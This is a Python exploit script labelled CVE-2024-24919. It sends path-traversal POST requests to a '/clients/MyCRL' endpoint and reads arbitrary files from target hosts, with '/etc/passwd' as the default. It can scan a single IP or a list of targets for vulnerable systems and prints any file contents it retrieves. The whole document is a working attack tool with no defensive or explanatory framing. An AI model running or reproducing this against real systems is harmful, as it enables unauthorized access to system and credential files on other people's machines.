#!/usr/bin/env python3

import argparse
import sys
import requests

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#from argparse import ArgumentParser

def poc(ip, path):
    target = f'https://{ip}/clients/MyCRL'
    data = f'aCSHELL/../../../../../../..{path}'

    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }

    response = requests.post(target, headers=headers, data=data, verify=False, timeout=3)

    if response.status_code == 200:
        print(f'{target}')
    else:
        return

def xpl(args):
    class Host:
        ip = args.ip
        list = args.list
        path = args.path
    target = f'https://{Host.ip}/clients/MyCRL'
    data = f'aCSHELL/../../../../../../..{Host.path}'
    
    headers = {
        'Host': f'{Host.ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        #'Content-Length': '48'
    }

    if Host.list == None:
        s = requests.Session()
        
        r = requests.Request(method='POST', url=target, headers=headers, data=data)
        prep = r.prepare()
        prep.url = target
        res = s.send(prep, verify=False, timeout=99)
        if res.status_code == 200:
            print(res.text)
        else:
            return
    else:
        try:
                with open(Host.list, 'r') as file:
                    targets = file.read().splitlines()
                    for ip in targets:
                        try:
                            poc(ip, args.path)
                        except Exception:
                            return
        except KeyboardInterrupt:
            return
    
def main():
    parser = argparse.ArgumentParser(description='CVE-2024-24919')
    parser.add_argument('-l', '--list', required=False, help='')
    parser.add_argument('-p', '--path', default='/etc/passwd')
    parser.add_argument('-i', '--ip', required=False)
    args = parser.parse_args()
    try:
        xpl(args)
    except Exception:
        return

if __name__ == '__main__':
    main()
    sys.exit(0)